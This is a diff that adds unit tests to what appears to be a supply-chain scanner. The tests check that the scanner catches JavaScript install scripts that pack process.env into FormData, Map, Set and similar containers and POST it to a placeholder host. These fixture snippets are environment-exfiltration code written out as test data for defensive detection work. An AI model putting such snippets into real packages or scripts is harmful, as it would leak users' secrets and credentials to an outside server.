@@ -318,6 +318,45 @@ class FlowShapesTests(unittest.TestCase):
         self.assertEqual(self.kind(with_client), ("identity", "user or host name"))
 
 
+class ContainerTests(unittest.TestCase):
+    """D-3 (0.1.9): what a script puts into a container, the container holds, on the tree as in the text. The
+    JavaScript tree model knew an array's push and unshift on a name alone, so an install script that put the whole
+    environment into a FormData, a Map or a Set, or Object.assign'ed it into an object, and sent that, had no finding
+    at all: the tree answered, and the text follower (which reads `x.append(…)` and `x.add(…)`) answers only what
+    the tree cannot read. Python's model had them (its COLLECTS). A member's container (`o.list.push(x)`,
+    `this.items.push(x)`) is still not followed: put into the object that holds it, it joined unrelated flows in
+    large bundles (vite's, monaco-editor's loader), two of the popular set's releases SUSPICIOUS."""
+
+    SEND = "fetch('https://x.invalid/c', {method: 'POST', body: %s});\n"
+    WHOLE = "sends environment variables over the network (the whole environment)"
+    FILLS = (
+        ("const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"),
+        ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(Object.fromEntries(c))"),
+        ("const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"),
+        ("const c = new URLSearchParams();\nc.append('e', JSON.stringify(process.env));\n", "c.toString()"),
+        ("const c = [];\nc.splice(0, 0, process.env);\n", "JSON.stringify(c)"),
+        ("const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"),
+        ("const c = {};\nReflect.set(c, 'e', process.env);\n", "JSON.stringify(c)"),
+        ("const c = new Map();\nfunction keep() { c.set('e', process.env); }\nkeep();\n", "JSON.stringify([...c])"),
+    )
+
+    def test_each_container_is_sent(self):
+        for fill, body in self.FILLS:
+            text = fill + self.SEND % body
+            with self.subTest(fill=fill):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.WHOLE])
+                reasons, _line = core.import_time_risk(text, lang="js")
+                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])
+
+    def test_what_is_not_sent(self):
+        quiet = ("const c = new Map();\nc.set('e', process.env);\n" + self.SEND % "'ok'",
+                 "const h = new Headers();\nh.set('accept', 'application/json');\n"
+                 "fetch('https://x.invalid/c', {method: 'POST', headers: h});\n")
+        for text in quiet:
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [])
+
+
 class WalletSwapTests(unittest.TestCase):
     """The detection round (0.1.8): a script that puts its own wallet address
     in place of the one its user copies or sends — patterns of two kinds of
